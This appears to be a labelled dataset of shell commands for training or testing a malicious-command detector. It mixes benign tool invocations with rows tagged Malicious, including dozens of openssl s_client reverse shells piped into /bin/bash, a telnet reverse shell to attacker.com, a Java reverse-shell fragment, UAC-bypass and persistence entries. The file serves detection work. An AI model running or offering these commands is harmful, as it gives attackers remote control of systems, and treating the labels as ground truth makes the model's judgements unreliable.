command,label,original_label,mitre_id
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
"find . -name ""*.h"" -print | xargs wc -l",Benign,Benign,Benign
redis-cli -h host -p port,Benign,Benign,Benign
C:\Windows\System32\utilman.exe,Malicious,Malicious,T1546
openssl s_client -quiet -connect 10.10.10.25:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){",Malicious,Malicious,T1059
ssh -L 8080:localhost:5432 backup@172.20.10.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
gummy [-b|--brightness] -10,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
"find /usr/local/svn/repos/ -maxdepth 1 -mindepth 1 -type d -printf ""%f\0"" | xargs -0 -I{} echo svnadmin hotcopy /usr/local/svn/repos/\{\} /usr/local/backup/\{\}",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:143,Malicious,Synthetic,Synthetic
/Library/LaunchAgents,Malicious,Malicious,T1543
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ccache gcc path/to/file.c,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
install-tl -portable,Benign,Benign,Benign
sort [-o|--output] path/to/output_file path/to/input_file,Benign,Benign,Benign
sudo nice --niceness_value command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 admin@10.0.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
grep -L -Z -r 'Subject: \[SPAM\]' . | xargs -0 -I{} mv {} DIR,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
nagios2 -v,Benign,Benign,Benign
mmls -t nested_table_type -o offset path/to/image_file,Benign,Benign,Benign
ssh -L 8080:localhost:80 backup@10.10.10.50,Context_Dependent,Synthetic,Synthetic
ssh -XY -t user@remote_IP 'ssh -XY -t user@remoteToRemote_IP',Benign,Benign,Benign
speaker-test [-t|--test] wav [-w|--wavfile] path/to/file.wav,Benign,Benign,Benign
toilet [-F|--filter] list,Benign,Benign,Benign
ssh -R 4444:localhost:22 backup@192.168.0.5,Context_Dependent,Synthetic,Synthetic
hcitool lp,Benign,Benign,Benign
find . -perm /g+s | head,Benign,Benign,Benign
pw-container [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:6379 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
cacls.exe,Malicious,Malicious,T1222
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
hydra -L path/to/usernames.txt -P path/to/wordlist.txt -M path/to/hosts.txt -F pop3,Benign,Benign,Benign
crane index append [-t|--tag] tag_name,Benign,Benign,Benign
imp [-s|--shell],Benign,Benign,Benign
ssh -R 4444:localhost:53 jenkins@update.bad,Context_Dependent,Synthetic,Synthetic
"gallery-dl --cookies-from-browser browser ""url""",Benign,Benign,Benign
keytool -genkeypair -v -keystore path/to/file.keystore -alias key_name,Benign,Benign,Benign
"eventcreate /l log_name /t type /id id /d ""message""",Benign,Benign,Benign
sudo uinput -d /dev/input/eventX /dev/input/eventY ...,Benign,Benign,Benign
"mimikatz ""net::computers""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
wait --help,Benign,Benign,Benign
xdg-open path/to/image,Benign,Benign,Benign
HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\,Malicious,Malicious,T1547
virtualenv path/to/venv,Benign,Benign,Benign
tldr argos-translate,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:6379 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
sudo lvchange [-k|--setactivationskip] y /dev/vg_name/lv_name,Benign,Benign,Benign
vainfo --display wayland|x11|drm|...,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
st-flash read firmware.bin 0x8000000 4096,Benign,Benign,Benign
ifconfig eth0 | grep addr: | awk '{ print $2 }' | cut -d: -f2,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:8081,Malicious,Synthetic,Synthetic
wafw00f [-i|--input] path/to/urls.txt -vv,Benign,Benign,Benign
ssh -R 8080:localhost:993 jenkins@support.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:6379 deploy@cdn-sync.bad,Context_Dependent,Synthetic,Synthetic
nix-instantiate --eval [-E|--expr] expression,Benign,Benign,Benign
qm set 100 --cores 4,Benign,Benign,Benign
find /Users/david/Desktop -type f \( -name '*.txt' -o -name '*.mpg' -o -name '*.jpg' \),Benign,Benign,Benign
kmutil find,Benign,Benign,Benign
ssh -R 8080:localhost:6379 user@192.168.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:80 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ncc build path/to/file.js,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
limine bios-install /dev/sdX,Benign,Benign,Benign
find . -name “*.old” -print | xargs rm,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
deluged,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
sudo ufw disable,Benign,Benign,Benign
sudo arptables [-D|--delete] INPUT rule_number,Benign,Benign,Benign
az pipelines update [--org|--organization] organization_url [-p|--project] project_name --name pipeline_name --new-name pipeline_new_name --new-folder-path user1/production_pipelines,Benign,Benign,Benign
opusenc path/to/input.wav --downmix-mono --bitrate 6 path/to/out.opus,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
dotnet run,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
thunderbird -P profile_name,Benign,Benign,Benign
find / -mount -name 'win*',Context_Dependent,Benign,Benign
aws s3 rm s3://bucket_name/path/to/file,Benign,Benign,Benign
iverilog -E path/to/source.v,Benign,Benign,Benign
ditto path/to/source_directory path/to/destination_directory,Benign,Benign,Benign
"find /Applications/ -name ""*.java"" -print0 | xargs -0 grep -i ""TODO""",Benign,Benign,Benign
ssh -R 8080:localhost:110 postgres@10.10.10.10,Context_Dependent,Synthetic,Synthetic
swipl path/to/file.pl,Benign,Benign,Benign
copr-cli build repository path/to/spec_file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:445,Malicious,Synthetic,Synthetic
portageq repos_config /,Benign,Benign,Benign
hostess add local.example.com 127.0.0.1,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9090,Malicious,Synthetic,Synthetic
mongoimport --type csv --file path/to/file.csv [-d|--db] database_name [-c|--collection] collection_name,Benign,Benign,Benign
"tgpt [-c|--code] ""prompt""",Benign,Benign,Benign
lynx -cookie_file=path/to/file example.com,Benign,Benign,Benign
find . -name *.bar -maxdepth 2 -print,Benign,Benign,Benign
"ping 8.8.8.8 | awk '{split($7,a,""[=.]"");if (a[2]>58) print a[2], strftime()}'",Benign,Benign,Benign
find -iname '.#*',Benign,Benign,Benign
"printf "" %02d"" $(seq 1 30)",Benign,Benign,Benign
git bundle create path/to/file.bundle -5 HEAD,Benign,Benign,Benign
exec 3>path/to/file,Benign,Benign,Benign
asar [p|pack] path/to/input_file_or_directory path/to/output_archive.asar,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:1433,Malicious,Synthetic,Synthetic
sudo aptitude remove package,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
cmd.exe /c eventvwr.msc,Malicious,Malicious,T1548
qgis [-n|--nologo],Benign,Benign,Benign
nativefier --icon path/to/icon.png url,Benign,Benign,Benign
Profile,Context_Dependent,Malicious,T1083
pw-top [-b|--batch-mode],Benign,Benign,Benign
SettingSyncHost -LoadAndRunDiagScript {PATH:.exe},Malicious,Malicious,T1218
maim [-s|--select] | xclip [-se|-selection] [c|clipboard] [-t|-target] image/png,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:22 backup@10.0.0.5,Context_Dependent,Synthetic,Synthetic
flac path/to/file.wav,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
checkupdates [-c|--change],Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
rfetch -a,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
heroku login,Benign,Benign,Benign
ssh -R 4444:localhost:1433 postgres@target.com,Context_Dependent,Synthetic,Synthetic
git daemon --export-all path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
"seq 1 10 | perl -e '@x=("""")x3;while(<>){print shift @x;push @x,$_}'",Benign,Benign,Benign
ssh -R 8080:localhost:9001 postgres@10.10.10.25,Context_Dependent,Synthetic,Synthetic
sdiag [-a|--all] --json|yaml,Benign,Benign,Benign
hyperfine [-w|--warmup] 5 'make',Benign,Benign,Benign
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket,Malicious,Malicious,T1059
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3389,Malicious,Synthetic,Synthetic
apt-cache show package,Benign,Benign,Benign
weechat --no-script,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9090,Malicious,Synthetic,Synthetic
git filter-branch --env-filter 'GIT_AUTHOR_EMAIL=new_email' HEAD,Benign,Benign,Benign
hf download --repo-type repo_type repo_id filename1 filename2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:3306 backup@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
aapt package -F path/to/app.apk path/to/directory,Benign,Benign,Benign
nix-collect-garbage,Benign,Benign,Benign
ssh -R 8080:localhost:80 backup@192.168.1.10,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:53 support@10.0.0.50,Context_Dependent,Synthetic,Synthetic
loc --files,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
git standup -a name|email -d 10 -g,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:53,Malicious,Synthetic,Synthetic
crane append --oci-empty-base,Benign,Benign,Benign
find /usr/src -name CVS -prune -o -depth +6 -print,Benign,Benign,Benign
docker [load|image load] [-i|--input] path/to/image_file.tar,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
cluster input.gv,Benign,Benign,Benign
flyctl apps list,Benign,Benign,Benign
find /usr -name filename.txt -print,Benign,Benign,Benign
find . -name '*.clj' -exec grep -r resources {} \;,Benign,Benign,Benign
ssh -R 8080:localhost:80 support@10.0.0.5,Context_Dependent,Synthetic,Synthetic
direnv deny .,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:1433,Malicious,Synthetic,Synthetic
pdftoppm -mono path/to/file.pdf image_name_prefix,Benign,Benign,Benign
gcc -x c -E /path/to/input-file,Context_Dependent,Malicious,T1005
tshark -Xlua_script:/path/to/temp-file,Malicious,Malicious,T1548
ical,Benign,Benign,Benign
tldr new-item,Benign,Benign,Benign
ssh -L 8080:localhost:995 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
gomi --prune orphans,Benign,Benign,Benign
tcptraceroute host destination_port packet_length,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
az config get section_name,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:8443 user@10.10.10.50,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:995 user@172.16.0.25,Context_Dependent,Synthetic,Synthetic
repo-add path/to/database.db.tar.gz,Benign,Benign,Benign
ssh -R 8080:localhost:8888 jenkins@172.16.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
gh pr merge pr_number [-m|--merge],Benign,Benign,Benign
ssh -R 8080:localhost:80 root@172.20.10.8,Context_Dependent,Synthetic,Synthetic
mpg321 [-Z|--random] path/to/file1|URL1 path/to/file2|URL2 ...,Benign,Benign,Benign
find . -name '*.c' -ls,Benign,Benign,Benign
nix-store [-q|--query] --tree /nix/store/checksum-package-version.ext,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
plasma-apply-cursortheme breeze_cursors,Benign,Benign,Benign
msginit,Benign,Benign,Benign
vcsh init repository_name,Benign,Benign,Benign
aws help topic_name,Benign,Benign,Benign
phpstorm diff path/to/left_file path/to/right_file,Benign,Benign,Benign
tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt,Malicious,Malicious,T1119
yadm --yadm-archive,Benign,Benign,Benign
